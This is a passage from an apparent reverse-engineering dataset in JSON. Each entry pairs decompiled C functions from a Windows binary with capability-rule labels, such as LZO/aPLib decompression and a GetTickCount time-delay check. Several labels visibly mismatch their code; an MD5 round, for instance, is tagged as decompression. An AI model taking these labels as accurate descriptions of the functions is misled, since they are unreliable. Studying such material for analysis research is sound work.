uVar4, arg_10h);\n            uVar4 = 0xd;\n            lpString2 = &var_40h;\n            goto code_r0x00403c79;\n        }\n        uVar4 = fcn.00405e30(0x4123d4, 6, 0x6c1e2eb5, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 6);\n        if (iVar5 == 0) {\n            var_10h = (*_sym.imp.SHLWAPI.dll_StrToIntA)(lpString + 6);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_StrChrA)(lpString, 0x7d);\n            iVar5 = iVar5 + (1 - lpString);\n            if (*0x42e98c < var_10h) {\n                var_10h = 1;\n            }\n            fcn.0040374f(&var_ch, &var_4h, *(*0x42e77c + -4 + var_10h * 4), iVar5);\n            lpString = lpString + iVar5;\n            iVar3 = iVar3 - iVar5;\n        }\n        else {\n            uVar4 = fcn.00405e30(0x4123dc, 5, 0xab6bb870, 0);\n            iVar5 = (*pcVar2)(lpString, uVar4, 5);\n            if (iVar5 == 0) {\n                fcn.0040374f(&var_ch, &var_4h, *0x42e988, 5);\n                lpString = lpString + 5;\n                iVar3 = iVar3 + -5;\n            }\n            else {\n                uVar1 = *lpString;\n                lpString = lpString + 1;\n                iVar3 = iVar3 + -1;\n                *var_4h = uVar1;\n                var_4h = var_4h + 1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 2918
    },
    "0040cf16": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040cf16(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    if (param_1 != 0) {\n        puVar3 = param_2 + param_1 * 4;\n        do {\n            puVar3 = puVar3 + -1;\n            uVar1 = *((param_3 - param_2) + puVar3);\n            uVar2 = *puVar3;\n            param_1 = param_1 + -1;\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 1;\n            }\n            if (uVar1 < uVar2) {\n                return 0xffffffff;\n            }\n        } while (param_1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 208
    },
    "0040cff9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040cff9(int32_t arg_8h, uint32_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_10h;\n    if (arg_10h < 0x20) {\n        arg_10h = 0;\n        uVar1 = uVar3;\n        uVar3 = arg_10h;\n        if (arg_14h != 0) {\n            arg_8h = arg_8h - arg_ch;\n            var_4h = arg_14h;\n            do {\n                uVar3 = (*arg_ch & ~(0xffffffffU >> (uVar1 & 0x1f))) >> (0x20 - uVar1 & 0x1f);\n                *(arg_8h + arg_ch) = *arg_ch << (uVar1 & 0x1f) | arg_10h;\n                arg_ch = arg_ch + 1;\n                var_4h = var_4h - 1;\n                arg_10h = uVar3;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + (arg_14h - uVar3);\n            uVar2 = arg_14h;\n            do {\n                uVar2 = uVar2 - 1;\n                puVar4 = puVar4 + -1;\n                if (uVar2 < uVar3) {\n                    *(arg_8h + uVar2 * 4) = 0;\n                }\n                else {\n                    *(arg_8h + uVar2 * 4) = *puVar4;\n                }\n            } while (uVar2 != 0);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar3 = arg_ch[arg_14h - uVar3] << arg_10h;\n        if (arg_10h != 0) {\n            uVar2 = fcn.0040cff9(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar3 = uVar3 | uVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 575
    },
    "0040d275": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d275(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t unaff_EDI;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((in_EAX == 0) || (arg_ch == 0)) {\n        var_4h = 0;\n    }\n    else {\n        uVar1 = 0x80000000;\n        var_8h = 0;\n        do {\n            if ((arg_ch & uVar1) != 0) break;\n            uVar1 = uVar1 >> 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0x20);\n        var_4h = fcn.0040cff9(unaff_EDI, arg_8h, var_8h, in_EAX);\n        arg_8h_00 = unaff_EDI + in_EAX * 4;\n        do {\n            arg_8h_00 = arg_8h_00 + -4;\n            fcn.0040c3ba(arg_8h_00, &var_4h, arg_ch << (var_8h & 0x1f));\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n        var_4h = var_4h >> (var_8h & 0x1f);\n    }\n    return var_4h;\n}\n",
        "token_count": 372
    },
    "00406ed8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.00406ed8(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EDI;\n    \n    cVar2 = fcn.00409e78();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    uVar5 = 0;\n    puVar1 = in_EAX + (unaff_EDI & 0xfffffffc);\n    for (iVar3 = -(unaff_EDI >> 2); iVar3 != 0; iVar3 = iVar3 + 1) {\n        uVar5 = uVar5 ^ (*(puVar1 + iVar3 * 4) * 0x16a88000 | *(puVar1 + iVar3 * 4) * -0x3361d2af >> 0x11) * 0x1b873593;\n        uVar5 = (uVar5 << 0xd | uVar5 >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar4 = unaff_EDI & 3;\n    uVar6 = 0;\n    if (uVar4 != 1) {\n        if (uVar4 != 2) {\n            if (uVar4 != 3) goto code_r0x00406f53;\n            uVar6 = puVar1[2] << 0x10;\n        }\n        uVar6 = uVar6 ^ puVar1[1] << 8;\n    }\n    uVar5 = uVar5 ^ ((*puVar1 ^ uVar6) * 0x16a88000 | (*puVar1 ^ uVar6) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x00406f53:\n    uVar5 = ((uVar5 ^ unaff_EDI) >> 0x10 ^ uVar5 ^ unaff_EDI) * -0x7a143595;\n    uVar5 = (uVar5 >> 0xd ^ uVar5) * -0x3d4d51cb;\n    return uVar5 >> 0x10 ^ uVar5;\n}\n",
        "token_count": 525
    },
    "00407d01": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d01(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    ushort *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = in_ECX + 2;\n    puVar4 = &var_48h;\n    iVar6 = 0x10;\n    do {\n        *puVar4 = CONCAT31(CONCAT21(*puVar2, *(puVar2 + -1)), *(puVar2 + -1));\n        puVar4 = puVar4 + 1;\n        puVar2 = puVar2 + 2;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar7 = arg_8h[1];\n    uVar5 = arg_8h[2];\n    uVar3 = (~uVar7 & arg_8h[3] | uVar5 & uVar7) + var_48h + -0x28955b88 + *arg_8h;\n    uVar1 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_44h + -0x173848aa + arg_8h[3];\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_40h + 0x242070db + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_3ch + -0x3e423112 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_38h + -0xa83f051 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_34h + 0x4787c62a + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_30h + -0x57cfb9ed + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_2ch + -0x2b96aff + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_28h + 0x698098d8 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_24h + -0x74bb0851 + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_20h + -0xa44f + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_1ch + -0x76a32842 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_18h + 0x6b901122 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_14h + -0x2678e6d + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_10h + -0x5986bc72 + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_ch + 0x49b40821 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_44h + -0x9e1da9e + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_30h + -0x3fbf4cc0 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_1ch + 0x265e5a51 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_48h + -0x16493856 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_34h + -0x29d0efa3 + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_20h + 0x2441453 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_ch + -0x275e197f + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_38h + -0x182c0438 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_24h + 0x21e1cde6 + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_10h + -0x3cc8f82a + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_3ch + -0xb2af279 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_28h + 0x455a14ed + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_14h + -0x561c16fb + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_40h + -0x3105c08 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_2ch + 0x676f02d9 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_18h + -0x72d5b376 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_34h + -0x5c6be + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_28h + -0x788e097f + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_1ch + 0x6d9d6122 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_10h + -0x21ac7f4 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_44h + -0x5b4115bc + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_38h + 0x4bdecfa9 + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_2ch + -0x944b4a0 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_20h + -0x41404390 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_14h + 0x289b7ec6 + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_48h + -0x155ed806 + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_3ch + -0x2b10cf7b + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_30h + 0x4881d05 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_24h + -0x262b2fc7 + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_18h + -0x1924661b + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_ch + 0x1fa27cf8 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_40h + -0x3b53a99b + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_48h + -0xbd6ddbc + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_2ch + 0x432aff97 + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_10h + -0x546bdc59 + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_34h + -0x36c5fc7 + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_18h + 0x655b59c3 + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_3ch + -0x70f3336e + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_20h + -0x100b83 + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_44h + -0x7a7ba22f + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_28h + 0x6fa87e4f + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_ch + -0x1d31920 + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_30h + -0x5cfebcec + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_14h + 0x4e0811a1 + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_38h + -0x8ac817e + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_1ch + -0x42c50dcb + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_40h + 0x2ad7d2bb + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    *arg_8h = *arg_8h + uVar1;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_24h + -0x14792c6f + uVar7;\n    arg_8h[1] = (uVar7 >> 0xb | uVar7 * 0x200000) + arg_8h[1] + uVar5;\n    arg_8h[2] = arg_8h[2] + uVar5;\n    arg_8h[3] = arg_8h[3] + uVar3;\n    return;\n}\n",
        "token_count": 4818
    },
    "0040e7df": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e7df(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0x89abcdef;\n    var_ch = 0x1234567;\n    if (0 < param_1 * 0x10) {\n        var_8h = (param_1 * 0x10 - 1U >> 4) + 1;\n        puVar2 = in_EAX + 0x1d0;\n        do {\n            uVar4 = puVar2[-0x47] & puVar2[1] ^ puVar2[0x1b] & puVar2[0x15] ^ puVar2[-0x73] ^ puVar2[0x1d] ^ var_ch;\n            uVar3 = puVar2[-0x48] & *puVar2 ^ puVar2[0x1a] & puVar2[0x14] ^ puVar2[-0x74] ^ puVar2[0x1c] ^ var_10h;\n            uVar3 = uVar3 ^ (uVar3 >> 10 | uVar4 << 0x16);\n            uVar4 = uVar4 ^ uVar4 >> 10;\n            puVar2[0x3f] = (uVar4 << 0xb | uVar3 >> 0x15) ^ uVar4;\n            uVar4 = puVar2[-0x46] & puVar2[2] ^ puVar2[0x1c] & puVar2[0x16] ^ puVar2[-0x72] ^ puVar2[0x1e] ^ var_10h;\n            uVar5 = puVar2[-0x45] & puVar2[3] ^ puVar2[0x1d] & puVar2[0x17] ^ puVar2[-0x71] ^ puVar2[0x1f] ^ var_ch;\n            puVar2[0x3e] = uVar3 << 0xb ^ uVar3;\n            uVar4 = uVar4 ^ (uVar4 >> 5 | uVar5 << 0x1b);\n            uVar5 = uVar5 ^ uVar5 >> 5;\n            puVar1 = puVar2 + 0x20;\n            puVar2[0x40] = uVar4 << 0x18 ^ uVar4;\n            puVar2[0x41] = (uVar5 << 0x18 | uVar4 >> 8) ^ uVar5;\n            uVar3 = puVar2[0x21];\n            uVar4 = puVar2[-0x44] & puVar2[4] ^ puVar2[0x18] & puVar2[0x1e] ^ puVar2[-0x70] ^ *puVar1 ^ var_10h;\n            uVar6 = puVar2[-0x43] & puVar2[5] ^ puVar2[0x19] & puVar2[0x1f] ^ puVar2[-0x6f] ^ uVar3 ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x42] = uVar4 << 9 ^ uVar4;\n            uVar5 = puVar2[-0x42] & puVar2[6] ^ puVar2[0x1a] & *puVar1 ^ puVar2[-0x6e] ^ puVar2[0x22] ^ var_10h;\n            uVar7 = puVar2[-0x41] & puVar2[7] ^ puVar2[0x1b] & uVar3 ^ puVar2[-0x6d] ^ puVar2[0x23] ^ var_ch;\n            puVar2[0x43] = (uVar6 << 9 | uVar4 >> 0x17) ^ uVar6;\n            uVar5 = uVar5 ^ (uVar5 >> 10 | uVar7 << 0x16);\n            uVar7 = uVar7 ^ uVar7 >> 10;\n            puVar2[0x44] = uVar5 << 0x10 ^ uVar5;\n            uVar4 = puVar2[-0x40] & puVar2[8] ^ puVar2[0x1c] & puVar2[0x22] ^ puVar2[-0x6c] ^ puVar2[0x24] ^ var_10h;\n            uVar6 = puVar2[-0x3f] & puVar2[9] ^ puVar2[0x1d] & puVar2[0x23] ^ puVar2[-0x6b] ^ puVar2[0x25] ^ var_ch;\n            puVar2[0x45] = (uVar7 << 0x10 | uVar5 >> 0x10) ^ uVar7;\n            uVar4 = uVar4 ^ (uVar4 >> 0xb | uVar6 << 0x15);\n            uVar6 = uVar6 ^ uVar6 >> 0xb;\n            puVar2[0x46] = uVar4 << 0xf ^ uVar4;\n            puVar2[0x47] = (uVar6 << 0xf | uVar4 >> 0x11) ^ uVar6;\n            uVar4 = puVar2[0x26];\n            uVar6 = puVar2[-0x3d] & puVar2[0xb] ^ puVar2[0x25] & puVar2[0x1f] ^ puVar2[-0x69] ^ puVar2[0x27] ^ var_ch;\n            uVar5 = puVar2[-0x3e] & puVar2[10] ^ puVar2[0x24] & puVar2[0x1e] ^ puVar2[-0x6a] ^ uVar4 ^ var_10h;\n            uVar5 = uVar5 ^ (uVar5 >> 0xc | uVar6 << 0x14);\n            uVar6 = uVar6 ^ uVar6 >> 0xc;\n            puVar2[0x49] = (uVar6 << 9 | uVar5 >> 0x17) ^ uVar6;\n            puVar2[0x48] = uVar5 << 9 ^ uVar5;\n            uVar5 = puVar2[-0x3c] & puVar2[0xc] ^ uVar4 & *puVar1 ^ puVar2[-0x68] ^ puVar2[0x28] ^ var_10h;\n            uVar3 = puVar2[-0x3b] & puVar2[0xd] ^ puVar2[0x27] & uVar3 ^ puVar2[-0x67] ^ puVar2[0x29] ^ var_ch;\n            uVar5 = uVar5 ^ (uVar5 >> 2 | uVar3 << 0x1e);\n            uVar3 = uVar3 ^ uVar3 >> 2;\n            puVar2[0x4a] = uVar5 << 0x1b ^ uVar5;\n            puVar2[0x4b] = (uVar3 << 0x1b | uVar5 >> 5) ^ uVar3;\n            uVar6 = puVar2[-0x3a] & puVar2[0xe] ^ puVar2[0x28] & puVar2[0x22] ^ puVar2[-0x66] ^ puVar2[0x2a] ^ var_10h;\n            uVar7 = puVar2[-0x39] & puVar2[0xf] ^ puVar2[0x29] & puVar2[0x23] ^ puVar2[-0x65] ^ puVar2[0x2b] ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 7 | uVar7 << 0x19);\n            uVar7 = uVar7 ^ uVar7 >> 7;\n            uVar3 = puVar2[0x2c];\n            uVar5 = puVar2[0x2d];\n            puVar2[0x4c] = uVar6 << 0xf ^ uVar6;\n            puVar2[0x4d] = (uVar7 << 0xf | uVar6 >> 0x11) ^ uVar7;\n            uVar6 = puVar2[-0x38] & puVar2[0x10] ^ puVar2[0x2a] & puVar2[0x24] ^ puVar2[-100] ^ uVar3 ^ var_10h;\n            uVar7 = puVar2[-0x37] & puVar2[0x11] ^ puVar2[0x2b] & puVar2[0x25] ^ puVar2[-99] ^ uVar5 ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 0xe | uVar7 << 0x12);\n            uVar7 = uVar7 ^ uVar7 >> 0xe;\n            puVar2[0x4e] = uVar6 << 6 ^ uVar6;\n            uVar4 = puVar2[-0x36] & puVar2[0x12] ^ uVar3 & uVar4 ^ puVar2[-0x62] ^ puVar2[0x2e] ^ var_10h;\n            puVar2[0x4f] = (uVar7 << 6 | uVar6 >> 0x1a) ^ uVar7;\n            uVar6 = puVar2[-0x35] & puVar2[0x13] ^ uVar5 & puVar2[0x27] ^ puVar2[-0x61] ^ puVar2[0x2f] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xf | uVar6 << 0x11);\n            uVar6 = uVar6 ^ uVar6 >> 0xf;\n            puVar2[0x50] = uVar4 << 2 ^ uVar4;\n            puVar2[0x51] = (uVar6 << 2 | uVar4 >> 0x1e) ^ uVar6;\n            uVar4 = puVar2[-0x34] & puVar2[0x14] ^ puVar2[0x2e] & puVar2[0x28] ^ puVar2[-0x60] ^ puVar2[0x30] ^ var_10h;\n            uVar6 = puVar2[-0x33] & puVar2[0x15] ^ puVar2[0x2f] & puVar2[0x29] ^ puVar2[-0x5f] ^ puVar2[0x31] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 7 | uVar6 << 0x19);\n            uVar6 = uVar6 ^ uVar6 >> 7;\n            puVar2[0x52] = uVar4 << 0x1d ^ uVar4;\n            puVar2[0x53] = (uVar6 << 0x1d | uVar4 >> 3) ^ uVar6;\n            uVar4 = puVar2[-0x32] & puVar2[0x16] ^ puVar2[0x30] & puVar2[0x2a] ^ puVar2[-0x5e] ^ puVar2[0x32] ^ var_10h;\n            uVar6 = puVar2[-0x31] & puVar2[0x17] ^ puVar2[0x31] & puVar2[0x2b] ^ puVar2[-0x5d] ^ puVar2[0x33] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x54] = uVar4 << 8 ^ uVar4;\n            uVar3 = puVar2[-0x30] & puVar2[0x18] ^ uVar3 & puVar2[0x32] ^ puVar2[-0x5c] ^ puVar2[0x34] ^ var_10h;\n            puVar2[0x55] = (uVar6 << 8 | uVar4 >> 0x18) ^ uVar6;\n            uVar4 = puVar2[-0x2f] & puVar2[0x19] ^ uVar5 & puVar2[0x33] ^ puVar2[-0x5b] ^ puVar2[0x35] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xb | uVar4 << 0x15);\n            uVar4 = uVar4 ^ uVar4 >> 0xb;\n            puVar2[0x57] = (uVar4 << 0xf | uVar3 >> 0x11) ^ uVar4;\n            puVar2[0x56] = uVar3 << 0xf ^ uVar3;\n            uVar3 = puVar2[-0x2e] & puVar2[0x1a] ^ puVar2[0x34] & puVar2[0x2e] ^ puVar2[-0x5a] ^ puVar2[0x36] ^ var_10h;\n            uVar4 = puVar2[-0x2d] & puVar2[0x1b] ^ puVar2[0x35] & puVar2[0x2f] ^ puVar2[-0x59] ^ 